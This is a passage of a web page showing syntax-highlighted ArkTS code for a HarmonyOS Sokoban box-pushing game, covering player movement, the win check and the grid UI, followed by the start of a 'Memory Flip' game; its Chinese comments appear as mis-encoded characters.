class="attr">newY</span>: number = <span class="variable language_">this</span>.<span class="property">playerPosition</span>.<span class="property">y</span> + dy;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">const</span> targetCell = <span class="variable language_">this</span>.<span class="property">grid</span>[newX][newY];</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// æ£€æŸ¥æ–°ä½ç½®æ˜¯å¦è¶…å‡ºè¾¹ç•Œ</span></span><br><span class="line">    <span class="keyword">if</span> (!targetCell) &#123;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// å¦‚æœæ–°ä½ç½®æ˜¯å¢™ï¼Œåˆ™ä¸èƒ½ç§»åŠ¨</span></span><br><span class="line">    <span class="keyword">if</span> (targetCell.<span class="property">type</span> === <span class="number">1</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">let</span> crateIndex = -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="title function_">isCratePositionVisible</span>(newX, newY)) &#123;</span><br><span class="line">      <span class="keyword">const</span> crateBehindCell = <span class="variable language_">this</span>.<span class="property">grid</span>[newX + dx][newY + dy];</span><br><span class="line">      <span class="keyword">if</span> (!crateBehindCell || crateBehindCell.<span class="property">type</span> !== <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line">      crateIndex = <span class="variable language_">this</span>.<span class="property">cratePositions</span>.<span class="title function_">findIndex</span>(<span class="function"><span class="params">crate</span> =&gt;</span> crate.<span class="property">x</span> === newX &amp;&amp; crate.<span class="property">y</span> === newY);</span><br><span class="line">      <span class="keyword">if</span> (crateIndex === -<span class="number">1</span> || <span class="variable language_">this</span>.<span class="title function_">isCratePositionVisible</span>(newX + dx, newY + dy)) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">isAnimationRunning</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isAnimationRunning</span> = <span class="literal">true</span></span><br><span class="line">    <span class="title function_">animateToImmediately</span>(&#123;</span><br><span class="line">      <span class="attr">duration</span>: <span class="number">150</span>,</span><br><span class="line">      <span class="attr">onFinish</span>: <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">animateToImmediately</span>(&#123;</span><br><span class="line">          <span class="attr">duration</span>: <span class="number">0</span>,</span><br><span class="line">          <span class="attr">onFinish</span>: <span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">isAnimationRunning</span> = <span class="literal">false</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">          <span class="keyword">if</span> (crateIndex !== -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">grid</span>[<span class="variable language_">this</span>.<span class="property">cratePositions</span>[crateIndex].<span class="property">x</span>][<span class="variable language_">this</span>.<span class="property">cratePositions</span>[crateIndex].<span class="property">y</span>].<span class="property">x</span> = <span class="number">0</span>;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">grid</span>[<span class="variable language_">this</span>.<span class="property">cratePositions</span>[crateIndex].<span class="property">x</span>][<span class="variable language_">this</span>.<span class="property">cratePositions</span>[crateIndex].<span class="property">y</span>].<span class="property">y</span> = <span class="number">0</span>;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">cratePositions</span>[crateIndex].<span class="property">x</span> += dx;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">cratePositions</span>[crateIndex].<span class="property">y</span> += dy;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">grid</span>[<span class="variable language_">this</span>.<span class="property">playerPosition</span>.<span class="property">x</span>][<span class="variable language_">this</span>.<span class="property">playerPosition</span>.<span class="property">y</span>].<span class="property">x</span> = <span class="number">0</span></span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">grid</span>[<span class="variable language_">this</span>.<span class="property">playerPosition</span>.<span class="property">x</span>][<span class="variable language_">this</span>.<span class="property">playerPosition</span>.<span class="property">y</span>].<span class="property">y</span> = <span class="number">0</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">playerPosition</span>.<span class="title function_">setPosition</span>(newX, newY);</span><br><span class="line"> </span><br><span class="line">          <span class="comment">// æ£€æŸ¥æ˜¯å¦è·èƒœ</span></span><br><span class="line">          <span class="keyword">const</span> isAllCrateOnTarget = <span class="variable language_">this</span>.<span class="property">cratePositions</span>.<span class="title function_">every</span>(<span class="function"><span class="params">crate</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">victoryPositions</span>.<span class="title function_">some</span>(<span class="function"><span class="params">victory</span> =&gt;</span> crate.<span class="property">x</span> === victory.<span class="property">x</span> &amp;&amp; crate.<span class="property">y</span> === victory.<span class="property">y</span>);</span><br><span class="line">          &#125;);</span><br><span class="line"> </span><br><span class="line">          <span class="keyword">if</span> (isAllCrateOnTarget) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;æ­å–œä½ ï¼Œä½ èµ¢äº†ï¼&quot;</span>);</span><br><span class="line">            <span class="comment">// å¯ä»¥åœ¨è¿™é‡Œæ·»åŠ èƒœåˆ©å¤„ç†é€»è¾‘</span></span><br><span class="line">            promptAction.<span class="title function_">showDialog</span>(&#123;</span><br><span class="line">              <span class="comment">// æ˜¾ç¤ºå¯¹è¯æ¡†</span></span><br><span class="line">              <span class="attr">title</span>: <span class="string">&#x27;æ¸¸æˆèƒœåˆ©ï¼&#x27;</span>, <span class="comment">// å¯¹è¯æ¡†æ ‡é¢˜</span></span><br><span class="line">              <span class="attr">message</span>: <span class="string">&#x27;æ­å–œä½ ï¼Œç”¨æ—¶ï¼š&#x27;</span> + ((<span class="title class_">Date</span>.<span class="title function_">now</span>() - <span class="variable language_">this</span>.<span class="property">startTime</span>) / <span class="number">1000</span>).<span class="title function_">toFixed</span>(<span class="number">3</span>) + <span class="string">&#x27;ç§’&#x27;</span>, <span class="comment">// å¯¹è¯æ¡†æ¶ˆæ¯</span></span><br><span class="line">              <span class="attr">buttons</span>: [&#123; <span class="attr">text</span>: <span class="string">&#x27;é‡æ–°å¼€å§‹&#x27;</span>, <span class="attr">color</span>: <span class="string">&#x27;#ffa500&#x27;</span> &#125;] <span class="comment">// å¯¹è¯æ¡†æŒ‰é’®</span></span><br><span class="line">            &#125;).<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// å¯¹è¯æ¡†å…³é—­åæ‰§è¡Œ</span></span><br><span class="line">              <span class="variable language_">this</span>.<span class="title function_">initializeGame</span>(); <span class="comment">// é‡æ–°å¼€å§‹æ¸¸æˆ</span></span><br><span class="line">            &#125;);</span><br><span class="line">          &#125;</span><br><span class="line"> </span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">grid</span>[<span class="variable language_">this</span>.<span class="property">playerPosition</span>.<span class="property">x</span>][<span class="variable language_">this</span>.<span class="property">playerPosition</span>.<span class="property">y</span>].<span class="property">x</span> = dy * <span class="variable language_">this</span>.<span class="property">cellWidth</span>;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">grid</span>[<span class="variable language_">this</span>.<span class="property">playerPosition</span>.<span class="property">x</span>][<span class="variable language_">this</span>.<span class="property">playerPosition</span>.<span class="property">y</span>].<span class="property">y</span> = dx * <span class="variable language_">this</span>.<span class="property">cellWidth</span>;</span><br><span class="line">      <span class="keyword">if</span> (crateIndex !== -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">grid</span>[<span class="variable language_">this</span>.<span class="property">cratePositions</span>[crateIndex].<span class="property">x</span>][<span class="variable language_">this</span>.<span class="property">cratePositions</span>[crateIndex].<span class="property">y</span>].<span class="property">x</span> = dy * <span class="variable language_">this</span>.<span class="property">cellWidth</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">grid</span>[<span class="variable language_">this</span>.<span class="property">cratePositions</span>[crateIndex].<span class="property">x</span>][<span class="variable language_">this</span>.<span class="property">cratePositions</span>[crateIndex].<span class="property">y</span>].<span class="property">y</span> = dx * <span class="variable language_">this</span>.<span class="property">cellWidth</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="string">`dx:<span class="subst">$&#123;dx&#125;</span>,dy:<span class="subst">$&#123;dy&#125;</span>`</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="title function_">build</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Column</span>(&#123; <span class="attr">space</span>: <span class="number">20</span> &#125;) &#123;</span><br><span class="line">      <span class="comment">//æ¸¸æˆåŒº</span></span><br><span class="line">      <span class="title class_">Stack</span>() &#123;</span><br><span class="line">        <span class="comment">//éé›¶åŒºåŠ ç“·ç –</span></span><br><span class="line">        <span class="title class_">Column</span>() &#123;</span><br><span class="line">          <span class="title class_">ForEach</span>(<span class="variable language_">this</span>.<span class="property">grid</span>, <span class="function">(<span class="params">row: [], rowIndex: number</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="title class_">Row</span>() &#123;</span><br><span class="line">              <span class="title class_">ForEach</span>(row, <span class="function">(<span class="params">item: Cell, colIndex: number</span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="title class_">Stack</span>() &#123;</span><br><span class="line">                  <span class="title class_">Text</span>()</span><br><span class="line">                    .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth&#125;</span>lpx`</span>)</span><br><span class="line">                    .<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth&#125;</span>lpx`</span>)</span><br><span class="line">                    .<span class="title function_">backgroundColor</span>(item.<span class="property">type</span> == <span class="number">0</span> ? <span class="title class_">Color</span>.<span class="property">Transparent</span> :</span><br><span class="line">                      ((rowIndex + colIndex) % <span class="number">2</span> == <span class="number">0</span> ? <span class="string">&quot;#cfb381&quot;</span> : <span class="string">&quot;#e1ca9f&quot;</span>))</span><br><span class="line">                    .<span class="title function_">borderRadius</span>(&#123;</span><br><span class="line">                      <span class="attr">topLeft</span>: item.<span class="property">topLeft</span> &gt; <span class="number">10</span> ? item.<span class="property">topLeft</span> : <span class="number">0</span>,</span><br><span class="line">                      <span class="attr">topRight</span>: item.<span class="property">topRight</span> &gt; <span class="number">10</span> ? item.<span class="property">topRight</span> : <span class="number">0</span>,</span><br><span class="line">                      <span class="attr">bottomLeft</span>: item.<span class="property">bottomLeft</span> &gt; <span class="number">10</span> ? item.<span class="property">bottomLeft</span> : <span class="number">0</span>,</span><br><span class="line">                      <span class="attr">bottomRight</span>: item.<span class="property">bottomRight</span> &gt; <span class="number">10</span> ? item.<span class="property">bottomRight</span> : <span class="number">0</span></span><br><span class="line">                    &#125;)</span><br><span class="line">                  <span class="comment">//å¦‚æœå’Œæ˜¯èƒœåˆ©åæ ‡ï¼Œæ˜¾ç¤ºå‰å·</span></span><br><span class="line">                  <span class="title class_">Stack</span>() &#123;</span><br><span class="line">                    <span class="title class_">Text</span>()</span><br><span class="line">                      .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth / <span class="number">2</span>&#125;</span>lpx`</span>)</span><br><span class="line">                      .<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth / <span class="number">8</span>&#125;</span>lpx`</span>)</span><br><span class="line">                      .<span class="title function_">backgroundColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>)</span><br><span class="line">                    <span class="title class_">Text</span>()</span><br><span class="line">                      .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth / <span class="number">8</span>&#125;</span>lpx`</span>)</span><br><span class="line">                      .<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth / <span class="number">2</span>&#125;</span>lpx`</span>)</span><br><span class="line">                      .<span class="title function_">backgroundColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>)</span><br><span class="line">                  &#125;.<span class="title function_">rotate</span>(&#123; <span class="attr">angle</span>: <span class="number">45</span> &#125;)</span><br><span class="line">                  .<span class="title function_">visibility</span>(<span class="variable language_">this</span>.<span class="title function_">isVictoryPositionVisible</span>(rowIndex, colIndex) ? <span class="title class_">Visibility</span>.<span class="property">Visible</span> : <span class="title class_">Visibility</span>.<span class="property">None</span>)</span><br><span class="line"> </span><br><span class="line">                &#125;</span><br><span class="line">              &#125;)</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;)</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="title class_">Column</span>() &#123;</span><br><span class="line">          <span class="title class_">ForEach</span>(<span class="variable language_">this</span>.<span class="property">grid</span>, <span class="function">(<span class="params">row: [], rowIndex: number</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="title class_">Row</span>() &#123;</span><br><span class="line">              <span class="title class_">ForEach</span>(row, <span class="function">(<span class="params">item: Cell, colIndex: number</span>) =&gt;</span> &#123;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">                <span class="comment">//æ˜¯å¦æ˜¾ç¤ºç®±å­</span></span><br><span class="line">                <span class="title class_">Stack</span>() &#123;</span><br><span class="line">                  <span class="title class_">Text</span>()</span><br><span class="line">                    .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth&#125;</span>lpx`</span>)</span><br><span class="line">                    .<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth&#125;</span>lpx`</span>)</span><br><span class="line">                    .<span class="title function_">backgroundColor</span>(item.<span class="property">type</span> == <span class="number">1</span> ? <span class="string">&quot;#412c0f&quot;</span> : <span class="title class_">Color</span>.<span class="property">Transparent</span>)</span><br><span class="line">                    .<span class="title function_">borderRadius</span>(&#123;</span><br><span class="line">                      <span class="attr">topLeft</span>: item.<span class="property">topLeft</span>,</span><br><span class="line">                      <span class="attr">topRight</span>: item.<span class="property">topRight</span>,</span><br><span class="line">                      <span class="attr">bottomLeft</span>: item.<span class="property">bottomLeft</span>,</span><br><span class="line">                      <span class="attr">bottomRight</span>: item.<span class="property">bottomRight</span></span><br><span class="line">                    &#125;)</span><br><span class="line">                  <span class="title class_">Text</span>(<span class="string">&#x27;ç®±&#x27;</span>)</span><br><span class="line">                    .<span class="title function_">fontColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>)</span><br><span class="line">                    .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">Center</span>)</span><br><span class="line">                    .<span class="title function_">fontSize</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth / <span class="number">2</span>&#125;</span>lpx`</span>)</span><br><span class="line">                    .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth - <span class="number">5</span>&#125;</span>lpx`</span>)</span><br><span class="line">                    .<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth - <span class="number">5</span>&#125;</span>lpx`</span>)</span><br><span class="line">                    .<span class="title function_">backgroundColor</span>(<span class="string">&quot;#cb8321&quot;</span>)<span class="comment">//#995d12   #cb8321</span></span><br><span class="line">                    .<span class="title function_">borderRadius</span>(<span class="number">10</span>)</span><br><span class="line">                    .<span class="title function_">visibility</span>(<span class="variable language_">this</span>.<span class="title function_">isCratePositionVisible</span>(rowIndex, colIndex) ? <span class="title class_">Visibility</span>.<span class="property">Visible</span> : <span class="title class_">Visibility</span>.<span class="property">None</span>)</span><br><span class="line">                  <span class="title class_">Text</span>(<span class="string">&#x27;æˆ‘&#x27;</span>)</span><br><span class="line">                    .<span class="title function_">fontColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>)</span><br><span class="line">                    .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">Center</span>)</span><br><span class="line">                    .<span class="title function_">fontSize</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth / <span class="number">2</span>&#125;</span>lpx`</span>)</span><br><span class="line">                    .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth - <span class="number">5</span>&#125;</span>lpx`</span>)</span><br><span class="line">                    .<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth - <span class="number">5</span>&#125;</span>lpx`</span>)</span><br><span class="line">                    .<span class="title function_">backgroundColor</span>(<span class="string">&quot;#007dfe&quot;</span>)<span class="comment">//#995d12   #cb8321</span></span><br><span class="line">                    .<span class="title function_">borderRadius</span>(<span class="number">10</span>)</span><br><span class="line">                    .<span class="title function_">visibility</span>(<span class="variable language_">this</span>.<span class="title function_">isPlayerPositionVisible</span>(rowIndex, colIndex) ? <span class="title class_">Visibility</span>.<span class="property">Visible</span> : <span class="title class_">Visibility</span>.<span class="property">None</span>)</span><br><span class="line">                &#125;</span><br><span class="line">                .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth&#125;</span>lpx`</span>)</span><br><span class="line">                .<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth&#125;</span>lpx`</span>)</span><br><span class="line">                .<span class="title function_">translate</span>(&#123; <span class="attr">x</span>: <span class="string">`<span class="subst">$&#123;item.x&#125;</span>lpx`</span>, <span class="attr">y</span>: <span class="string">`<span class="subst">$&#123;item.y&#125;</span>lpx`</span> &#125;)</span><br><span class="line"> </span><br><span class="line">              &#125;)</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line">      <span class="title class_">Button</span>(<span class="string">&#x27;é‡æ–°å¼€å§‹&#x27;</span>).<span class="title function_">clickEffect</span>(&#123; <span class="attr">level</span>: <span class="title class_">ClickEffectLevel</span>.<span class="property">MIDDLE</span> &#125;)</span><br><span class="line">        .<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">          <span class="variable language_">this</span>.<span class="title function_">initializeGame</span>();</span><br><span class="line">        &#125;);</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">    .<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>)</span><br><span class="line">    .<span class="title function_">height</span>(<span class="string">&#x27;100%&#x27;</span>)</span><br><span class="line">    .<span class="title function_">backgroundColor</span>(<span class="string">&quot;#fdb300&quot;</span>)</span><br><span class="line">    .<span class="title function_">padding</span>(&#123; <span class="attr">top</span>: <span class="number">20</span> &#125;)</span><br><span class="line">    .<span class="title function_">onTouch</span>(<span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (e.<span class="property">type</span> === <span class="title class_">TouchType</span>.<span class="property">Down</span> &amp;&amp; e.<span class="property">touches</span>.<span class="property">length</span> &gt; <span class="number">0</span>) &#123; <span class="comment">// è§¦æ‘¸å¼€å§‹ï¼Œè®°å½•åˆå§‹ä½ç½®</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">screenStartX</span> = e.<span class="property">touches</span>[<span class="number">0</span>].<span class="property">x</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">screenStartY</span> = e.<span class="property">touches</span>[<span class="number">0</span>].<span class="property">y</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (e.<span class="property">type</span> === <span class="title class_">TouchType</span>.<span class="property">Up</span> &amp;&amp; e.<span class="property">changedTouches</span>.<span class="property">length</span> &gt; <span class="number">0</span>) &#123; <span class="comment">// å½“æ‰‹æŒ‡æŠ¬èµ·æ—¶ï¼Œæ›´æ–°æœ€åçš„ä½ç½®</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">lastScreenX</span> = e.<span class="property">changedTouches</span>[<span class="number">0</span>].<span class="property">x</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">lastScreenY</span> = e.<span class="property">changedTouches</span>[<span class="number">0</span>].<span class="property">y</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">gesture</span>(</span><br><span class="line">      <span class="title class_">SwipeGesture</span>(&#123; <span class="attr">direction</span>: <span class="title class_">SwipeDirection</span>.<span class="property">All</span> &#125;)<span class="comment">// æ”¯æŒæ–¹å‘ä¸­ allå¯ä»¥æ˜¯ä¸Šä¸‹å·¦å³</span></span><br><span class="line">        .<span class="title function_">onAction</span>(<span class="function">(<span class="params">_event: GestureEvent</span>) =&gt;</span> &#123;</span><br><span class="line">          <span class="keyword">const</span> swipeX = <span class="variable language_">this</span>.<span class="property">lastScreenX</span> - <span class="variable language_">this</span>.<span class="property">screenStartX</span>;</span><br><span class="line">          <span class="keyword">const</span> swipeY = <span class="variable language_">this</span>.<span class="property">lastScreenY</span> - <span class="variable language_">this</span>.<span class="property">screenStartY</span>;</span><br><span class="line">          <span class="comment">// æ¸…é™¤å¼€å§‹ä½ç½®è®°å½•ï¼Œå‡†å¤‡ä¸‹ä¸€æ¬¡æ»‘åŠ¨åˆ¤æ–­</span></span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">screenStartX</span> = <span class="number">0</span>;</span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">screenStartY</span> = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">if</span> (<span class="title class_">Math</span>.<span class="title function_">abs</span>(swipeX) &gt; <span class="title class_">Math</span>.<span class="title function_">abs</span>(swipeY)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (swipeX &gt; <span class="number">0</span>) &#123;</span><br><span class="line">              <span class="comment">// å‘å³æ»‘åŠ¨</span></span><br><span class="line">              <span class="variable language_">this</span>.<span class="title function_">movePlayer</span>(<span class="string">&#x27;right&#x27;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="comment">// å‘å·¦æ»‘åŠ¨</span></span><br><span class="line">              <span class="variable language_">this</span>.<span class="title function_">movePlayer</span>(<span class="string">&#x27;left&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (swipeY &gt; <span class="number">0</span>) &#123;</span><br><span class="line">              <span class="comment">// å‘ä¸‹æ»‘åŠ¨</span></span><br><span class="line">              <span class="variable language_">this</span>.<span class="title function_">movePlayer</span>(<span class="string">&#x27;down&#x27;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="comment">// å‘ä¸Šæ»‘åŠ¨</span></span><br><span class="line">              <span class="variable language_">this</span>.<span class="title function_">movePlayer</span>(<span class="string">&#x27;up&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Memory-Flip"><a href="#Memory-Flip" class="headerlink" title="Memory Flip"></a>Memory Flip</h1><p>è®°å¿†ç¿»è½¬</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; promptAction &#125; <span class="keyword">from</span> <span class="string">&#x27;@kit.ArkUI&#x27;</span> <span class="comment">// å¯¼å…¥ç”¨äºæ˜¾ç¤ºå¯¹è¯æ¡†çš„æ¨¡å—</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½¿ç”¨è£…é¥°å™¨æ¥è§‚å¯Ÿæ•°æ®å˜åŒ–</span></span><br><span class="line">@<span class="title class_">ObservedV2</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">GameCell</span> &#123; <span class="comment">// å®šä¹‰å•å…ƒæ 